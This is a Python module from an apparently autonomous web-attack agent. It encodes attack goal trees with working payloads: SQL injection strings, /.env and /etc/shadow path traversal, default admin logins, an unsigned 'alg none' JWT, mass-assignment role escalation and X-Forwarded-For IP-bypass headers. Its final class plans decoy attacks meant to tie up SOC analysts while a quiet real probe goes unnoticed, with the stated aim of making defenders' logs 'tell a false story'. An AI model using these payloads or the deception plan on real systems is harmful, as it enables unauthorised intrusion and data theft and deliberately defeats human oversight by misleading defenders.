"""Apex Cognition -- Cognitive capabilities that don't exist anywhere.

Not "better scanning." Not "more APIs." These are the thinking patterns
of the top 0.1% of security researchers, formalized into code for the
first time.

1. AbductiveReasoner: Sherlock Holmes for security. From a set of
   observations, infer what MUST be true about the target's internals.
   "The 500 took 200ms but the 403 took 5ms" -> "our input bypassed
   the WAF and reached the backend." This is how elite researchers
   think. No tool does this.

2. GoalDecomposer: "Get admin access" is not an action. It's a GOAL.
   Decompose it into a search tree: credentials OR bypass OR escalation.
   Each branch has sub-branches. As paths fail, prune them and increase
   confidence in alternatives. Live reasoning about what's still possible.

3. HypothesisTester: The scientific method applied to hacking.
   Observe -> Hypothesize -> Predict -> Test -> Update beliefs.
   "I hypothesize the staging server has debug mode on because the
   company is a startup using Django." Test it. If confirmed, branch
   into new hypotheses from there.

4. EmergentVulnFinder: Component A is secure. Component B is secure.
   A + B together have a vulnerability because A's output becomes B's
   input in a way nobody tested. This is where the $100K bounties live.

5. CognitiveDeception: Don't just avoid detection. ACTIVELY mislead
   the defender. Send decoy requests to make them investigate the wrong
   endpoint while the real probe hits the actual target. Make their
   logs tell a false story.

BACKGROUND PATH ONLY -- never import in hot path
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any

from app.core.logging import get_logger

logger = get_logger(__name__)


# ---------------------------------------------------------------------------
# Data structures
# ---------------------------------------------------------------------------

@dataclass
class Abduction:
    """An inference about what must be true given observations."""
    observation: str  # What we saw
    inference: str  # What it means
    confidence: float  # How certain (0.0-1.0)
    testable_prediction: str  # How to verify this inference
    implications: list[str] = field(default_factory=list)  # What else follows


@dataclass
class GoalNode:
    """A node in the goal decomposition tree."""
    goal: str
    approach: str  # "OR" (any child succeeds) or "AND" (all must succeed)
    status: str = "open"  # "open", "achieved", "failed", "pruned"
    children: list["GoalNode"] = field(default_factory=list)
    actions: list[dict[str, Any]] = field(default_factory=list)  # Concrete operations
    failure_reason: str = ""
    depth: int = 0


@dataclass
class Hypothesis:
    """A testable hypothesis about the target."""
    statement: str  # "The staging server has debug mode enabled"
    reasoning: str  # Why we think this
    prediction: str  # "If true, GET /debug will return 200"
    test_action: dict[str, Any] = field(default_factory=dict)  # Operation to test it
    result: str = ""  # "confirmed", "refuted", "inconclusive"
    confidence_before: float = 0.5  # Prior probability
    confidence_after: float = 0.5  # Posterior after testing
    spawned_hypotheses: list[str] = field(default_factory=list)  # New hypotheses if confirmed


@dataclass
class EmergentVuln:
    """A vulnerability that emerges from component interaction."""
    component_a: str
    component_b: str
    interaction: str  # How they interact
    vulnerability: str  # What goes wrong
    severity: str
    proof_concept: str  # How to demonstrate it


@dataclass
class DeceptionPlan:
    """A plan to actively mislead defender systems."""
    objective: str  # What we're actually trying to do
    decoy_actions: list[dict[str, Any]]  # Requests to distract the SOC
    real_action: dict[str, Any]  # The actual probe
    timing: str  # When to execute the real action relative to decoys
    expected_defender_response: str  # What the SOC will do with decoys


# ---------------------------------------------------------------------------
# 1. Abductive Reasoning Engine
# ---------------------------------------------------------------------------

class AbductiveReasoner:
    """Sherlock Holmes for security.

    Deductive: If WAF is on, scans will be blocked. (Everyone does this.)
    Inductive: Last 10 scans were blocked, so this one will be too. (Common.)
    ABDUCTIVE: The scan was blocked in 5ms. Therefore it was blocked at
    the proxy layer, not the application. Therefore the application
    never saw our request. Therefore bypassing the proxy bypasses ALL
    protection. (Nobody does this systematically.)

    Abduction is inference to the BEST EXPLANATION. Given observations,
    what configuration of the target's internals best explains what we see?
    """

    # Abductive rules: observation -> inference
    # Each rule maps a pattern of observations to what they imply
    _ABDUCTION_RULES: list[dict[str, Any]] = [
        {
            "observation": "fast_rejection",
            "pattern": {"status_code": [403, 503], "response_time_ms_lt": 20},
            "inference": "Request rejected at proxy/WAF layer, never reached application",
            "implications": [
                "Application-level vulnerabilities are NOT being tested",
                "Bypassing the proxy bypasses ALL security",
                "Try accessing the origin IP directly",
                "Try HTTP/1.0 or unusual methods to confuse the proxy",
            ],
            "confidence": 0.8,
            "test": "Send the same request to the origin IP (if known) or via different protocol",
        },
        {
            "observation": "slow_error",
            "pattern": {"status_code": [500, 502], "response_time_ms_gt": 1000},
            "inference": "Input reached the backend and caused processing failure",
            "implications": [
                "WAF did NOT block this input -- it passed through",
                "The backend parser/handler crashed on our input",
                "This input shape is a viable attack vector",
                "Try variations of this input to refine the crash",
            ],
            "confidence": 0.85,
            "test": "Send a slightly modified version to confirm the crash is reproducible",
        },
        {
            "observation": "differential_timing",
            "pattern": {"same_path": True, "timing_variance_gt": 500},
            "inference": "Different inputs trigger different code paths in the backend",
            "implications": [
                "The application processes inputs differently based on content",
                "Timing differences can be used as an oracle",
                "True/false conditions can be extracted via timing",
                "Blind injection may be possible using timing as feedback",
            ],
            "confidence": 0.75,
            "test": "Send boolean-condition payloads and measure timing for true vs false",
        },
        {
            "observation": "size_differential",
            "pattern": {"same_status": True, "body_size_variance_gt": 500},
            "inference": "Different inputs produce different content behind the same status code",
            "implications": [
                "Access control may be content-based, not status-based",
                "User enumeration possible via response size",
                "Hidden content accessible with right input",
            ],
            "confidence": 0.7,
            "test": "Compare response bodies to identify what content differs",
        },
        {
            "observation": "header_inconsistency",
            "pattern": {"server_header_changes": True},
            "inference": "Multiple backend servers behind the load balancer",
            "implications": [
                "Some backends may have different security configurations",
                "Sticky sessions can be used to target a specific backend",
                "One backend may be running an older, vulnerable version",
                "Race conditions between backends may exist",
            ],
            "confidence": 0.8,
            "test": "Send many requests and categorize responses by server header",
        },
        {
            "observation": "redirect_to_internal",
            "pattern": {"status_code": [301, 302], "location_contains": ["localhost", "127.", "10.", "192.168.", "internal"]},
            "inference": "Application leaks internal network topology via redirects",
            "implications": [
                "Internal hostnames and IPs are exposed",
                "SSRF may be possible by requesting those internal URLs",
                "The redirect handler doesn't sanitize Location header",
            ],
            "confidence": 0.9,
            "test": "Follow the redirect chain and map all internal references",
        },
        {
            "observation": "cookie_leak",
            "pattern": {"set_cookie_without_secure": True},
            "inference": "Session cookies transmittable over plain HTTP",
            "implications": [
                "Session hijacking possible on any HTTP connection",
                "MitM attack can steal authentication",
                "If any page loads over HTTP, cookies are exposed",
            ],
            "confidence": 0.85,
            "test": "Check if the same cookies are sent over HTTP",
        },
        {
            "observation": "error_message_internal_path",
            "pattern": {"body_contains": ["/home/", "/var/www/", "C:\\\\", "/app/", "/opt/"]},
            "inference": "Application reveals filesystem structure in errors",
            "implications": [
                "Web root path is known -- path traversal targets identified",
                "Operating system identified (Linux vs Windows)",
                "Deployment path reveals framework and structure",
                "Config files can be targeted at known paths",
            ],
            "confidence": 0.9,
            "test": "Use the revealed path to construct targeted path traversal payloads",
        },
    ]

    def abduce(self, observations: list[dict[str, Any]]) -> list[Abduction]:
        """From observations, infer what must be true about the target.

        observations: list of dicts with keys like status_code,
        response_time_ms, body, headers, url, etc.
        """
        abductions = []

        for rule in self._ABDUCTION_RULES:
            if self._matches_pattern(observations, rule["pattern"]):
                abductions.append(Abduction(
                    observation=rule["observation"],
                    inference=rule["inference"],
                    confidence=rule["confidence"],
                    testable_prediction=rule["test"],
                    implications=rule["implications"],
                ))

        # Cross-observation abductions (combining multiple signals)
        abductions.extend(self._cross_abduce(observations))

        # Sort by confidence descending
        abductions.sort(key=lambda a: -a.confidence)
        return abductions

    def _matches_pattern(self, observations: list[dict], pattern: dict) -> bool:
        """Check if any observation matches a rule pattern."""
        for obs in observations:
            match = True
            for key, value in pattern.items():
                if key == "status_code" and isinstance(value, list):
                    if obs.get("status_code") not in value:
                        match = False
                elif key == "response_time_ms_lt":
                    if obs.get("response_time_ms", 9999) >= value:
                        match = False
                elif key == "response_time_ms_gt":
                    if obs.get("response_time_ms", 0) <= value:
                        match = False
                elif key == "same_path":
                    pass  # Handled in cross-observation
                elif key == "timing_variance_gt":
                    pass  # Handled in cross-observation
                elif key == "same_status":
                    pass  # Handled in cross-observation
                elif key == "body_size_variance_gt":
                    pass  # Handled in cross-observation
                elif key == "server_header_changes":
                    pass  # Handled in cross-observation
                elif key == "location_contains":
                    location = obs.get("headers", {}).get("location", "")
                    if not any(v in location.lower() for v in value):
                        match = False
                elif key == "set_cookie_without_secure":
                    cookies = obs.get("headers", {}).get("set-cookie", "")
                    if "secure" in cookies.lower() or not cookies:
                        match = False
                elif key == "body_contains":
                    body = str(obs.get("body", ""))
                    if not any(v in body for v in value):
                        match = False
            if match:
                return True
        return False

    def _cross_abduce(self, observations: list[dict]) -> list[Abduction]:
        """Abductions that require comparing multiple observations."""
        abductions = []

        if len(observations) < 2:
            return abductions

        # Check timing variance
        times = [o.get("response_time_ms", 0) for o in observations if o.get("response_time_ms")]
        if times and max(times) - min(times) > 500:
            abductions.append(Abduction(
                observation="differential_timing",
                inference=(
                    f"Timing range {min(times)}-{max(times)}ms across requests. "
                    f"Different inputs trigger different backend code paths."
                ),
                confidence=0.75,
                testable_prediction="Use timing as boolean oracle for blind injection",
                implications=[
                    "Time-based blind SQL injection may be feasible",
                    "Different processing paths reveal business logic",
                    "Slowest path likely involves database or external calls",
                ],
            ))

        # Check body size variance with same status
        status_groups: dict[int, list[int]] = {}
        for o in observations:
            sc = o.get("status_code", 0)
            bl = o.get("body_length", len(str(o.get("body", ""))))
            status_groups.setdefault(sc, []).append(bl)
        for status, sizes in status_groups.items():
            if len(sizes) >= 2 and max(sizes) - min(sizes) > 500:
                abductions.append(Abduction(
                    observation="size_differential",
                    inference=(
                        f"Status {status} returns {min(sizes)}-{max(sizes)} bytes. "
                        f"Different content behind identical status codes."
                    ),
                    confidence=0.7,
                    testable_prediction="Compare response bodies to identify hidden content differences",
                    implications=[
                        "Resource enumeration possible via response size",
                        "Access control checks may be inconsistent",
                    ],
                ))

        # Check for multiple server headers
        servers = set()
        for o in observations:
            s = o.get("headers", {}).get("server", "")
            if s:
                servers.add(s)
        if len(servers) > 1:
            abductions.append(Abduction(
                observation="header_inconsistency",
                inference=f"Multiple backends detected: {servers}",
                confidence=0.8,
                testable_prediction="Target specific backends via sticky sessions or timing",
                implications=[
                    "Backend configuration may differ between servers",
                    "One backend may be running vulnerable software",
                    "Race conditions between backends possible",
                ],
            ))

        return abductions


# ---------------------------------------------------------------------------
# 2. Recursive Goal Decomposition
# ---------------------------------------------------------------------------

class GoalDecomposer:
    """Decomposes high-level goals into executable search trees.

    "Get admin access" is not an action. It's a goal. A goal becomes
    a tree of sub-goals, each decomposable into concrete actions.
    As branches fail, they're pruned. Confidence redistributes
    to remaining branches. The tree is LIVE -- it evolves as we learn.

    This is how elite researchers think. They don't try random things.
    They systematically explore and prune the possibility space.
    """

    # Goal templates: common high-level goals and their decompositions
    _GOAL_TEMPLATES: dict[str, dict[str, Any]] = {
        "admin_access": {
            "goal": "Gain administrative access",
            "approach": "OR",
            "children": [
                {
                    "goal": "Find valid admin credentials",
                    "approach": "OR",
                    "children": [
                        {"goal": "Extract credentials from source code", "approach": "AND",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/.env"}},
                             {"op": "http_request", "params": {"path": "/.git/config"}},
                             {"op": "http_request", "params": {"path": "/config.json"}},
                         ]},
                        {"goal": "Find credentials in error messages", "approach": "AND",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/admin", "method": "POST", "body": "invalid"}},
                         ]},
                        {"goal": "Default credentials", "approach": "OR",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/admin/login", "method": "POST",
                              "body": "username=admin&password=admin"}},
                             {"op": "http_request", "params": {"path": "/admin/login", "method": "POST",
                              "body": "username=admin&password=password"}},
                         ]},
                        {"goal": "Credentials from OSINT/breaches", "approach": "AND",
                         "actions": [{"op": "osint_breach_check"}]},
                    ],
                },
                {
                    "goal": "Bypass authentication entirely",
                    "approach": "OR",
                    "children": [
                        {"goal": "Access admin panel without auth", "approach": "AND",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/admin/dashboard"}},
                             {"op": "http_request", "params": {"path": "/admin/api/users"}},
                         ]},
                        {"goal": "JWT/session manipulation", "approach": "OR",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/admin",
                              "headers": {"Authorization": "Bearer eyJhbGciOiJub25lIn0.eyJyb2xlIjoiYWRtaW4ifQ."}}},
                         ]},
                        {"goal": "IDOR to admin resources", "approach": "AND",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/api/users/1"}},
                             {"op": "http_request", "params": {"path": "/api/users/1", "method": "PUT",
                              "body": '{"role": "admin"}'}},
                         ]},
                    ],
                },
                {
                    "goal": "Escalate from low-privilege access",
                    "approach": "OR",
                    "children": [
                        {"goal": "Find privilege escalation endpoint", "approach": "AND",
                         "actions": [
                             {"op": "http_request", "params": {"path": "/api/users/me/role"}},
                             {"op": "http_request", "params": {"path": "/api/settings"}},
                         ]},
                    ],
                },
            ],
        },
        "data_exfiltration": {
            "goal": "Prove access to sensitive data",
            "approach": "OR",
            "children": [
                {
                    "goal": "Direct database access",
                    "approach": "OR",
                    "children": [
                        {"goal": "SQL injection", "actions": [
                            {"op": "http_request", "params": {"path": "/api/search?q=' OR 1=1--"}},
                        ]},
                        {"goal": "Exposed database port", "actions": [
                            {"op": "tcp_connect", "params": {"port": 5432}},
                            {"op": "tcp_connect", "params": {"port": 3306}},
                            {"op": "tcp_connect", "params": {"port": 27017}},
                        ]},
                    ],
                },
                {
                    "goal": "API data access without auth",
                    "approach": "AND",
                    "actions": [
                        {"op": "http_request", "params": {"path": "/api/v1/users"}},
                        {"op": "http_request", "params": {"path": "/api/v1/users?limit=1000"}},
                        {"op": "http_request", "params": {"path": "/graphql",
                         "method": "POST", "body": '{"query": "{ users { email } }"}'}},
                    ],
                },
                {
                    "goal": "File system access",
                    "approach": "OR",
                    "actions": [
                        {"op": "http_request", "params": {"path": "/api/files/../../etc/passwd"}},
                        {"op": "http_request", "params": {"path": "/download?file=../../../etc/shadow"}},
                    ],
                },
            ],
        },
    }

    def decompose(self, goal: str, target: str = "") -> GoalNode:
        """Decompose a high-level goal into an executable tree."""
        # Match to template
        template_key = self._match_goal(goal)
        if template_key and template_key in self._GOAL_TEMPLATES:
            template = self._GOAL_TEMPLATES[template_key]
            return self._build_tree(template, target, depth=0)

        # Generic decomposition
        return GoalNode(
            goal=goal,
            approach="OR",
            children=[
                GoalNode(goal=f"Reconnaissance: map {goal} surface", approach="AND", depth=1),
                GoalNode(goal=f"Direct attempt: try {goal} directly", approach="AND", depth=1),
                GoalNode(goal=f"Indirect: find alternative path to {goal}", approach="OR", depth=1),
            ],
        )

    def prune(self, tree: GoalNode, failed_action: str, reason: str) -> None:
        """Prune a failed branch and update the tree."""
        self._prune_recursive(tree, failed_action, reason)

    def get_next_actions(self, tree: GoalNode) -> list[dict[str, Any]]:
        """Get the next concrete actions to try from open branches."""
        actions = []
        self._collect_actions(tree, actions)
        return actions[:5]  # Return top 5 most promising

    def to_thinking_log(self, tree: GoalNode, indent: int = 0) -> list[str]:
        """Convert the goal tree to a thinking log for the OODA loop."""
        lines = []
        prefix = "  " * indent
        status_icon = {"open": "[ ]", "achieved": "[+]", "failed": "[X]", "pruned": "[-]"}
        icon = status_icon.get(tree.status, "[ ]")

        lines.append(f"{prefix}{icon} {tree.goal} ({tree.approach})")
        if tree.failure_reason:
            lines.append(f"{prefix}    Failed: {tree.failure_reason}")
        for action in tree.actions:
            lines.append(f"{prefix}    Action: {action.get('op', '?')} {action.get('params', {})}")
        for child in tree.children:
            lines.extend(self.to_thinking_log(child, indent + 1))
        return lines

    def _match_goal(self, goal: str) -> str:
        text = goal.lower()
        if any(k in text for k in ("admin", "privilege", "escalat", "root")):
            return "admin_access"
        elif any(k in text for k in ("data", "exfil", "extract", "database", "leak")):
            return "data_exfiltration"
        return ""

    def _build_tree(self, template: dict, target: str, depth: int) -> GoalNode:
        node = GoalNode(
            goal=template.get("goal", ""),
            approach=template.get("approach", "OR"),
            depth=depth,
        )
        # Inject target into action params
        for action in template.get("actions", []):
            a = dict(action)
            params = dict(a.get("params", {}))
            if "path" in params and target:
                base = f"https://{target}" if not target.startswith("http") else target
                params["url"] = f"{base.rstrip('/')}{params.pop('path')}"
            a["params"] = params
            node.actions.append(a)

        for child_template in template.get("children", []):
            child = self._build_tree(child_template, target, depth + 1)
            node.children.append(child)
        return node

    def _prune_recursive(self, node: GoalNode, failed: str, reason: str) -> bool:
        for action in node.actions:
            if failed in str(action):
                node.status = "failed"
                node.failure_reason = reason
                return True
        for child in node.children:
            if self._prune_recursive(child, failed, reason):
                return True
        return False

    def _collect_actions(self, node: GoalNode, actions: list) -> None:
        if node.status != "open":
            return
        actions.extend(node.actions)
        for child in node.children:
            self._collect_actions(child, actions)


# ---------------------------------------------------------------------------
# 3. Hypothesis-Driven Testing
# ---------------------------------------------------------------------------

class HypothesisTester:
    """The scientific method applied to penetration testing.

    Observe -> Hypothesize -> Predict -> Test -> Update beliefs.

    Most tools: "Try SQL injection on every parameter."
    Hypothesis-driven: "Based on the Django version header and the
    error message format, I hypothesize the ORM has a raw() call
    in the search endpoint. My prediction: a time-based payload
    on the 'q' parameter will cause a 5-second delay."

    Each confirmed hypothesis spawns new hypotheses, creating
    a branching investigation tree driven by evidence.
    """

    # Hypothesis templates based on observations
    _HYPOTHESIS_GENERATORS: list[dict[str, Any]] = [
        {
            "trigger": {"technology": "django"},
            "hypothesis": "Django admin panel exists at /admin/",
            "prediction": "GET /admin/ returns 200 or 302 (not 404)",
            "test": {"op": "http_request", "params": {"path": "/admin/"}},
            "if_confirmed": [
                "Default admin credentials (admin/admin) may work",
                "Django debug toolbar may be enabled in dev mode",
            ],
        },
        {
            "trigger": {"technology": "express"},
            "hypothesis": "Express error handler leaks stack traces",
            "prediction": "Malformed JSON POST returns stack trace in body",
            "test": {"op": "http_request", "params": {"method": "POST", "path": "/api",
                     "body": "{invalid", "headers": {"Content-Type": "application/json"}}},
            "if_confirmed": [
                "Internal file paths revealed in stack trace",
                "Node.js version may be identifiable",
            ],
        },
        {
            "trigger": {"technology": "graphql"},
            "hypothesis": "GraphQL introspection is enabled",
            "prediction": "Introspection query returns full schema",
            "test": {"op": "http_request", "params": {"method": "POST", "path": "/graphql",
                     "body": '{"query": "{ __schema { types { name } } }"}',
                     "headers": {"Content-Type": "application/json"}}},
            "if_confirmed": [
                "Full API schema is exposed -- enumerate all queries and mutations",
                "Hidden admin mutations may exist",
                "Input types reveal validation expectations",
            ],
        },
        {
            "trigger": {"status_code": 403, "path": "/admin"},
            "hypothesis": "Admin panel exists but is IP-restricted",
            "prediction": "Adding X-Forwarded-For header may bypass IP restriction",
            "test": {"op": "http_request", "params": {"path": "/admin",
                     "headers": {"X-Forwarded-For": "127.0.0.1"}}},
            "if_confirmed": [
                "IP-based access control is bypassable via header injection",
                "Reverse proxy trusts X-Forwarded-For without validation",
            ],
        },
        {
            "trigger": {"waf_detected": True},
            "hypothesis": "WAF only inspects GET parameters, not POST body",
            "prediction": "Same payload in POST body passes while GET param is blocked",
            "test": {"op": "http_request", "params": {"method": "POST", "path": "/search",
                     "body": "q=' OR 1=1--", "headers": {"Content-Type": "application/x-www-form-urlencoded"}}},
            "if_confirmed": [
                "WAF has inconsistent inspection -- POST body is unprotected",
                "All injection testing should use POST method",
            ],
        },
        {
            "trigger": {"accept_all_email": True},
            "hypothesis": "Email server accepts all addresses (catch-all) -- no user enumeration via email",
            "prediction": "Sending to random@domain returns same response as valid addresses",
            "test": {"op": "check", "params": {"type": "email_catchall"}},
            "if_confirmed": [
                "Cannot verify individual email existence via SMTP",
                "But this also means ANY email reaches the system -- useful for social engineering",
            ],
        },
        {
            "trigger": {"api_versioned": True},
            "hypothesis": "Old API version still accessible with weaker security",
            "prediction": "Replacing /v2/ with /v1/ in API calls returns data",
            "test": {"op": "http_request", "params": {"path": "/api/v1/users"}},
            "if_confirmed": [
                "Old API version has weaker or no authentication",
                "Deprecated endpoints may have unpatched vulnerabilities",
            ],
        },
    ]

    def generate_hypotheses(
        self,
        observations: dict[str, Any],
    ) -> list[Hypothesis]:
        """Generate hypotheses from current observations."""
        hypotheses = []

        technologies = observations.get("technologies", [])
        status_codes = observations.get("status_codes", {})
        waf = observations.get("waf_detected", "")
        api_patterns = observations.get("api_patterns", [])

        for gen in self._HYPOTHESIS_GENERATORS:
            trigger = gen["trigger"]
            triggered = False

            if "technology" in trigger:
                if any(trigger["technology"] in t.lower() for t in technologies):
                    triggered = True
            if "status_code" in trigger and "path" in trigger:
                if trigger["status_code"] in status_codes.values():
                    triggered = True
            if trigger.get("waf_detected") and waf:
                triggered = True
            if trigger.get("accept_all_email") and observations.get("accept_all_email"):
                triggered = True
            if trigger.get("api_versioned") and any("/v" in p for p in api_patterns):
                triggered = True

            if triggered:
                hypotheses.append(Hypothesis(
                    statement=gen["hypothesis"],
                    reasoning=f"Triggered by observation: {trigger}",
                    prediction=gen["prediction"],
                    test_action=gen["test"],
                    confidence_before=0.5,
                    spawned_hypotheses=gen.get("if_confirmed", []),
                ))

        return hypotheses

    def update_hypothesis(
        self,
        hypothesis: Hypothesis,
        test_result: dict[str, Any],
    ) -> Hypothesis:
        """Update hypothesis confidence based on test results."""
        status = test_result.get("status_code", 0)
        success = test_result.get("success", False)
        body = str(test_result.get("body", ""))

        # Simple Bayesian update
        if success and status in (200, 301, 302):
            hypothesis.result = "confirmed"
            hypothesis.confidence_after = min(0.95, hypothesis.confidence_before + 0.3)
        elif status == 404:
            hypothesis.result = "refuted"
            hypothesis.confidence_after = max(0.05, hypothesis.confidence_before - 0.3)
        elif status == 403:
            # 403 means it EXISTS but is protected -- partial confirmation
            hypothesis.result = "partial"
            hypothesis.confidence_after = min(0.8, hypothesis.confidence_before + 0.15)
        else:
            hypothesis.result = "inconclusive"
            hypothesis.confidence_after = hypothesis.confidence_before

        return hypothesis


# ---------------------------------------------------------------------------
# 4. Emergent Vulnerability Finder
# ---------------------------------------------------------------------------

class EmergentVulnFinder:
    """Finds vulnerabilities in component INTERACTIONS.

    Component A is secure alone. Component B is secure alone.
    But A's output feeds into B in a way nobody tested.

    Example: The login form escapes HTML (XSS-safe). The admin
    dashboard displays usernames raw. Register with username
    "<script>alert(1)</script>". Login form is safe. Dashboard
    is now XSS'd. Neither component has a bug individually.

    These are the $100K bounties. Finding them requires understanding
    HOW components connect, not just testing each one.
    """

    # Known emergent vulnerability patterns
    _INTERACTION_PATTERNS: list[dict[str, Any]] = [
        {
            "name": "stored_xss_via_registration",
            "component_a": "User registration / profile update",
            "component_b": "Admin dashboard / user listing",
            "interaction": "User-controlled input stored in DB, displayed in admin context",
            "vulnerability": "Stored XSS: safe in user context, dangerous in admin context",
            "severity": "high",
            "test_approach": "Register with XSS payload in name/bio, check if admin panel renders it",
        },
        {
            "name": "ssrf_via_webhook",
            "component_a": "Webhook/callback URL configuration",
            "component_b": "Internal service mesh / API gateway",
            "interaction": "User-configured URL is fetched by server, hitting internal services",
            "vulnerability": "SSRF: webhook handler makes requests to internal endpoints",
            "severity": "critical",
            "test_approach": "Set webhook URL to internal IP (127.0.0.1, metadata endpoint)",
        },
        {
            "name": "auth_bypass_via_api_gateway",
            "component_a": "API gateway / reverse proxy",
            "component_b": "Backend application",
            "interaction": "Gateway handles auth but backend trusts all requests from gateway",
            "vulnerability": "Direct access to backend (bypassing gateway) has no auth",
            "severity": "critical",
            "test_approach": "Find the backend's direct IP/port and access without auth",
        },
        {
            "name": "race_condition_double_spend",
            "component_a": "Balance check endpoint",
            "component_b": "Transaction execution endpoint",
            "interaction": "Check and execute are separate calls, not atomic",
            "vulnerability": "TOCTOU: send two transactions simultaneously, both pass balance check",
            "severity": "critical",
            "test_approach": "Send identical withdrawal requests in parallel",
        },
        {
            "name": "cache_poisoning",
            "component_a": "CDN/cache layer",
            "component_b": "Application that varies response by header",
            "interaction": "CDN caches response, but response content depends on request headers",
            "vulnerability": "Attacker's header-dependent response cached and served to everyone",
            "severity": "high",
            "test_approach": "Send request with X-Forwarded-Host, check if cached response reflects it",
        },
        {
            "name": "deserialization_via_upload",
            "component_a": "File upload handler",
            "component_b": "File processing / thumbnail generation",
            "interaction": "Upload accepts file, processor deserializes it",
            "vulnerability": "Malicious file causes RCE during processing (ImageTragick, etc.)",
            "severity": "critical",
            "test_approach": "Upload crafted file (SVG with embedded script, polyglot PDF)",
        },
        {
            "name": "privilege_escalation_via_mass_assignment",
            "component_a": "User profile update endpoint",
            "component_b": "Role/permission model",
            "interaction": "Profile update accepts arbitrary fields, including role",
            "vulnerability": "Adding role=admin to profile update request grants admin",
            "severity": "critical",
            "test_approach": "Send profile update with extra fields (role, is_admin, permissions)",
        },
    ]

    def find_emergent_vulns(
        self,
        components: list[str],
        technologies: list[str],
        findings: list[dict[str, Any]],
    ) -> list[EmergentVuln]:
        """Find potential emergent vulnerabilities based on known components."""
        vulns = []

        # Match against interaction patterns
        components_lower = " ".join(c.lower() for c in components)
        tech_lower = " ".join(t.lower() for t in technologies)
        findings_str = " ".join(str(f) for f in findings).lower()

        for pattern in self._INTERACTION_PATTERNS:
            # Score how likely this pattern applies
            score = 0
            a_lower = pattern["component_a"].lower()
            b_lower = pattern["component_b"].lower()

            # Check if components match
            for keyword in a_lower.split():
                if keyword in components_lower or keyword in tech_lower or keyword in findings_str:
                    score += 1
            for keyword in b_lower.split():
                if keyword in components_lower or keyword in tech_lower or keyword in findings_str:
                    score += 1

            if score >= 2:  # At least 2 keyword matches
                vulns.append(EmergentVuln(
                    component_a=pattern["component_a"],
                    component_b=pattern["component_b"],
                    interaction=pattern["interaction"],
                    vulnerability=pattern["vulnerability"],
                    severity=pattern["severity"],
                    proof_concept=pattern["test_approach"],
                ))

        return vulns


# ---------------------------------------------------------------------------
# 5. Cognitive Deception Engine
# ---------------------------------------------------------------------------

class CognitiveDeceptionEngine:
    """Actively mislead defender systems.

    Not just avoiding detection. CREATING a false narrative in the
    defender's logs. While they investigate the decoy, the real
    probe completes unnoticed.

    This is how nation-state actors operate. Every action has two
    purposes: what it does, and what it makes the defender THINK.
    """

    def plan_deception(
        self,
        real_objective: str,
        target: str,
        defenses: list[str],
    ) -> DeceptionPlan:
        """Plan a deception operation.

        The real probe is hidden among decoy requests that
        attract the defender's attention elsewhere.
        """
        if not target.startswith("http"):
            target = f"https://{target}"
        base = target.rstrip("/")

        # Decoys: noisy, obvious, attention-grabbing requests
        # that look like a script kiddie attack on an unrelated path
        decoys = [
            {
                "url": f"{base}/admin/login",
                "method": "POST",
                "body": "username=admin&password=admin",
                "purpose": "DECOY: obvious credential guess triggers auth alert",
                "delay_before_ms": 0,
            },
            {
                "url": f"{base}/wp-admin/",
                "method": "GET",
                "purpose": "DECOY: WordPress scan looks like automated tool",
                "delay_before_ms": 500,
            },
            {
                "url": f"{base}/?id=1%20OR%201=1",
                "method": "GET",
                "purpose": "DECOY: obvious SQLi attempt triggers WAF/IDS alert",
                "delay_before_ms": 1000,
            },
        ]

        # The real probe: quiet, subtle, during the noise
        real_probes = {
            "admin_access": {
                "url": f"{base}/api/v1/users/me",
                "method": "GET",
                "headers": {"Authorization": "Bearer null"},
                "purpose": "REAL: test if API enforces auth (looks like a normal API call)",
                "delay_before_ms": 1500,  # After decoys grabbed attention
            },
            "data_access": {
                "url": f"{base}/api/v1/export",
                "method": "GET",
                "purpose": "REAL: test data export endpoint while SOC investigates the SQLi decoy",
                "delay_before_ms": 2000,
            },
        }

        # Select real probe based on objective
        real = real_probes.get("admin_access", list(real_probes.values())[0])
        if "data" in real_objective.lower():
            real = real_probes.get("data_access", real)

        return DeceptionPlan(
            objective=real_objective,
            decoy_actions=decoys,
            real_action=real,
            timing=(
                "Decoys fire at t=0, t+500ms, t+1000ms creating a burst of alerts. "
                "Real probe fires at t+1500ms when SOC analyst is reading the first alert. "
                "Real probe looks like normal API traffic, not an attack."
            ),
            expected_defender_response=(
                "SOC investigates obvious attacks on /admin and /?id=1 OR 1=1. "
                "IDS/WAF rules trigger on known SQLi pattern. Analyst spends "
                "5-10 minutes reviewing false positives. During that window, "
                "the real API probe is buried in normal traffic logs."
            ),
        )
